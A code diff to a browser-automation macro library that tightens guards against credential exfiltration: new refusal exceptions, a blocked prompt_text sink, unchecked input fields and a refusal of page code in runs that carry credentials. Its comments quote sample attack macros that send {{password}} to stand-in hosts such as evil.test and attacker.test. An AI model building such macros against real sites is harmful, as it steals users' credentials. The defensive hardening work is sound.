@@ -32,6 +32,8 @@ from collections.abc import Callable
 from typing import Any
 from urllib.parse import urlsplit
 
+from octowright.safety_stop import SafetyStop
+
 # Action fields that either leave the machine or execute code. A credential
 # expanded into one of these is exfiltration, not automation:
 # ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
@@ -51,13 +53,18 @@ from urllib.parse import urlsplit
 # "https://attacker.test/**"`` delivered the password to that host. mock_route's
 # ``body`` is served to the page -- for a script request it is code the page
 # runs. An upload's ``paths`` entry becomes the filename the server receives.
+# ``set_dialog_policy``'s ``prompt_text`` is ``prompt()``'s return value for
+# whichever page next calls it, on any origin, and the policy outlives the step
+# and the run: arming it with ``{{password}}`` and then navigating handed the
+# password to that page.
 # Audited against every action in ``runtime._ACTION_MAP``: the remaining string
 # fields (selectors, locator text, ``pattern`` match strings, ``expect_*``
 # needles, ``value``/``text`` typed into the page, the screenshot ``path``
 # contained under RECORDINGS_DIR) are matched locally or ARE the intended
-# destination of a credential.
+# destination of a credential -- the typed ones only through the fill-origin
+# check; the inputs that have none are `CREDENTIAL_UNCHECKED_INPUT_FIELDS`.
 CREDENTIAL_UNSAFE_KEYS = frozenset(
-    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths"}
+    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths", "prompt_text"}
 )
 
 CREDENTIAL_SINKS_ENV = "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS"
@@ -74,6 +81,23 @@ def credential_sinks_blocked() -> bool:
     """
     raw = os.environ.get(CREDENTIAL_SINKS_ENV, "block").strip().lower()
     return raw not in _CREDENTIAL_SINKS_OFF
+
+
+class CredentialSafetyStop(SafetyStop):
+    """A credential check stopped a macro: a verdict on the macro, never a flaky page.
+
+    A macro's ``try`` and ``try_each`` (``octowright.conditional``) re-raise it
+    rather than suppressing it or moving on to another branch, so a refusal
+    always fails the run and is reported instead of reading as success.
+    """
+
+
+class CredentialRefusal(CredentialSafetyStop, ValueError):
+    """A credential step refused before it ran. Still a ``ValueError`` for every existing caller."""
+
+
+class CredentialInputHalted(CredentialSafetyStop, RuntimeError):
+    """A credential step stopped while typing. Still a ``RuntimeError`` for every existing caller."""
 
 
 # Recorded keys that need renaming to match the method's parameter names.
@@ -184,6 +208,16 @@ def headers_reach_trusted_origin(action: dict[str, Any], trusted_origins: frozen
 #: credential through here -- it is the intended destination -- so what is
 #: checked instead is WHICH page it lands in (`offsite_credential_origin`).
 CREDENTIAL_FILL_FIELDS = {"fill": "value", "fill_by": "value", "type": "text"}
+#: Fields that put a value into the page with NO delivery-bound origin check.
+#: A key press goes to whatever document has focus -- a cross-origin iframe
+#: included -- and a selection to whichever frame the selector resolves in, so
+#: the pre-dispatch read of the active frame's URL cannot vouch for either. A
+#: credential is refused there outright: ``type`` keys one in under the check.
+CREDENTIAL_UNCHECKED_INPUT_FIELDS: dict[str, tuple[str, ...]] = {
+    "press_key": ("key",),
+    "select_option": ("value", "label"),
+    "a11y_dragdrop": ("nav_key", "nav_key_sequence", "grab_key", "drop_key", "release_key"),
+}
 #: A step's own list of extra origins it may type a credential into, for a
 #: sign-in hop to an identity provider. An input to the guard, never to the call.
 ALLOWED_ORIGINS_KEY = "allowed_origins"
@@ -220,7 +254,7 @@ def parse_allowed_origins(value: object) -> frozenset[Origin]:
     if value is None:
         return frozenset()
     if not isinstance(value, list):
-        raise ValueError(
+        raise CredentialRefusal(
             f"{ALLOWED_ORIGINS_KEY} must be a list of origins such as ['https://login.example'], "
             f"got {type(value).__name__}"
         )
@@ -228,7 +262,7 @@ def parse_allowed_origins(value: object) -> frozenset[Origin]:
     for entry in value:
         origin = url_origin(entry) if isinstance(entry, str) and _EXACT_ORIGIN.match(entry) else None
         if origin is None:
-            raise ValueError(
+            raise CredentialRefusal(
                 f"{ALLOWED_ORIGINS_KEY} entry {str(entry)[:120]!r} is not an exact origin; write it "
                 "literally as scheme://host[:port], with no wildcard, path or {{placeholder}}"
             )
@@ -259,9 +293,9 @@ def offsite_credential_origin(
     return f"{scheme}:" if scheme else "<no page>"
 
 
-def credential_fill_refusal(action: dict[str, Any], shown: str) -> ValueError:
+def credential_fill_refusal(action: dict[str, Any], shown: str) -> CredentialRefusal:
     names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
-    return ValueError(
+    return CredentialRefusal(
         f"macro {action.get('action')} would type credential arg {names} into a page at {shown}, "
         "which is not the session's own origin (its launch URL or persona base_url). For an "
         f'intended sign-in hop, list the origin literally on this step: "{ALLOWED_ORIGINS_KEY}": ["{shown}"]. '
@@ -270,7 +304,7 @@ def credential_fill_refusal(action: dict[str, Any], shown: str) -> ValueError:
     )
 
 
-def credential_input_stopped(action: dict[str, Any], reason: str, *, started: bool = True) -> RuntimeError:
+def credential_input_stopped(action: dict[str, Any], reason: str, *, started: bool = True) -> CredentialInputHalted:
     """A credential step that stopped, naming the step and why -- never the value, nor how much was typed.
 
     ``started`` is ``CredentialInputStopped.started``: a step stopped before
@@ -278,11 +312,11 @@ def credential_input_stopped(action: dict[str, Any], reason: str, *, started: bo
     """
     names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
     if not started:
-        return RuntimeError(
+        return CredentialInputHalted(
             f"macro {action.get('action')} did not start typing credential arg {names}: {reason}. "
             "Nothing was typed; re-run the step once the page has settled."
         )
-    return RuntimeError(
+    return CredentialInputHalted(
         f"macro {action.get('action')} stopped typing credential arg {names}: {reason}. "
         "The rest of the value was not typed; re-run the step once the page has settled."
     )
@@ -296,8 +330,90 @@ def dispatch_fields(action: dict[str, Any]) -> dict[str, Any]:
     return {key: value for key, value in action.items() if key not in guard_only}
 
 
-def _sink_refusal(key: str) -> ValueError:
-    return ValueError(
+#: Fields whose value runs as JavaScript in the page: ``evaluate``,
+#: ``expect_js`` and ``wait_for``'s ``expression``, and ``a11y_dragdrop``'s
+#: predicates. A ``mock_route`` ``body`` joins them (`page_code_field`): the
+#: page runs it when it answers a script or document request.
+PAGE_CODE_KEYS = ("expression", "verify_js", "grabbed_predicate_js")
+
+
+def page_code_field(action: dict[str, Any]) -> str | None:
+    """The field through which *action* runs code in the page, or None."""
+    for key in PAGE_CODE_KEYS:
+        if action.get(key):
+            return key
+    if action.get("action") == "mock_route" and action.get("body"):
+        return "body"
+    return None
+
+
+def credential_args_in(
+    actions: Any,
+    *,
+    is_credential: Callable[[str], bool],
+    placeholder: re.Pattern[str] | str,
+    credential_args: frozenset[str] = frozenset(),
+) -> list[str]:
+    """The credential-tier args *actions*, as written, expand anywhere, by name.
+
+    Any field and any depth -- a nested body, a ``macro_call``'s ``args`` --
+    since wherever a credential goes, the page can come to hold it.
+    """
+    compiled = re.compile(placeholder) if isinstance(placeholder, str) else placeholder
+    names: set[str] = set()
+    stack: list[Any] = [actions]
+    while stack:
+        item = stack.pop()
+        if isinstance(item, str):
+            names.update(compiled.findall(item))
+        elif isinstance(item, dict):
+            stack.extend(item.values())
+        elif isinstance(item, list):
+            stack.extend(item)
+    return sorted(name for name in names if name in credential_args or is_credential(name))
+
+
+def page_code_refusal(
+    action: dict[str, Any], credential_names: list[str] | tuple[str, ...]
+) -> CredentialRefusal | None:
+    """Why *action* may not run in a run that expands *credential_names*, or None.
+
+    The sink guard judges only fields a credential placeholder expands into,
+    and the fill check only where the value lands. Page code needs neither: a
+    constant ``evaluate`` that installs an ``input`` listener before a
+    credential fill on the session's own origin -- or reads the field back
+    after it -- sends the value wherever it likes. So in a run that carries a
+    credential, page code is refused before or after the fill alike. Names
+    the step's field and the args, never a value.
+    """
+    if not credential_names or not credential_sinks_blocked():
+        return None
+    field = page_code_field(action)
+    if field is None:
+        return None
+    names = ", ".join("{{" + str(name) + "}}" for name in credential_names)
+    return CredentialRefusal(
+        f"macro {action.get('action')} runs page code ({field}) in a run that types credential arg {names}; "
+        "page code can read a typed credential back and send it anywhere. Run it in a macro that carries "
+        f"no credential, or set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
+    )
+
+
+def refuse_page_code(actions: Any, credential_names: list[str] | tuple[str, ...]) -> None:
+    """Raise `page_code_refusal` for the first page-code step in *actions*, at any depth."""
+    stack: list[Any] = [actions]
+    while stack:
+        item = stack.pop(0)
+        if isinstance(item, list):
+            stack[:0] = item
+        elif isinstance(item, dict):
+            if isinstance(item.get("action"), str) and (refusal := page_code_refusal(item, credential_names)):
+                raise refusal
+            stack.extend(value for value in item.values() if isinstance(value, (dict, list)))
+
+
+def _sink_refusal(key: str) -> CredentialRefusal:
+    return CredentialRefusal(
         f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
         "this would send the secret off-machine. A header may carry one through "
         "inject_headers whose pattern spells out the session's own origin -- scheme, host "
@@ -336,16 +452,41 @@ class _Expander:
 
         return self.placeholder.sub(replacer, value)
 
+    def action_name(self, written: Any) -> Any:
+        """The action a step will dispatch as: its ``action`` field, expanded.
+
+        Resolved before anything else about the step is judged. Classifying
+        the name as written made ``{"action": "{{kind}}", "value":
+        "{{password}}"}`` an unknown action -- no credential marker, so no
+        origin check -- that then dispatched as a ``fill``; a ``{{call}}``
+        resolving to ``macro_call`` lost its taint the same way. A
+        credential-tier arg is refused as a name whatever the sink setting:
+        it has no use there, and an unknown-action error would carry it.
+        """
+        if not isinstance(written, str):
+            return written
+        for key in self.placeholder.findall(written):
+            if self.is_credential(key):
+                raise CredentialRefusal(
+                    f"macro uses credential arg {{{{{key}}}}} as an action name; an action name must "
+                    "be written literally or come from a non-credential arg"
+                )
+        return self.text(written, unsafe_sink=False)
+
     def action(self, node: dict[str, Any]) -> dict[str, Any]:
-        kind = str(node.get("action"))
-        node = canonical_aliases(kind, node)
+        resolved = self.action_name(node.get("action"))
+        kind = str(resolved)
+        node = canonical_aliases(kind, {**node, "action": resolved})
         node.pop(CREDENTIAL_FILL_MARKER, None)
         node.pop(CREDENTIAL_CALL_MARKER, None)
+        self._refuse_unchecked_input(kind, node)
         credentials = self._typed_credentials(kind, node)
         tainted = self._tainted_call_args(node) if kind == "macro_call" else []
         headers_exempt = headers_reach_trusted_origin(node, self.trusted_origins)
         expanded = {
-            key: self.value(
+            key: item
+            if key == "action"
+            else self.value(
                 item,
                 unsafe_sink=key in CREDENTIAL_UNSAFE_KEYS and not (headers_exempt and key == "headers"),
             )
@@ -372,6 +513,27 @@ class _Expander:
         if not isinstance(call_args, dict):
             return []
         return sorted(str(key) for key, value in call_args.items() if self._mentions_credential(value))
+
+    def _refuse_unchecked_input(self, kind: str, node: dict[str, Any]) -> None:
+        """Refuse a credential-tier arg in a field `CREDENTIAL_UNCHECKED_INPUT_FIELDS` names."""
+        if not self.blocked:
+            return
+        for field_name in CREDENTIAL_UNCHECKED_INPUT_FIELDS.get(kind, ()):
+            names = self._credential_names(node.get(field_name))
+            if names:
+                shown = ", ".join("{{" + name + "}}" for name in names)
+                raise CredentialRefusal(
+                    f"macro {kind} puts credential arg {shown} into the page through {field_name!r}, "
+                    "where nothing checks which origin receives it. Key a credential in with a type or "
+                    f"fill step, which do; set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
+                )
+
+    def _credential_names(self, value: Any) -> list[str]:
+        if isinstance(value, str):
+            return sorted({name for name in self.placeholder.findall(value) if self.is_credential(name)})
+        if isinstance(value, list):
+            return sorted({name for item in value for name in self._credential_names(item)})
+        return []
 
     def _typed_credentials(self, kind: str, node: dict[str, Any]) -> list[str]:
         """The credential-tier args a typing step puts into the page, by name."""
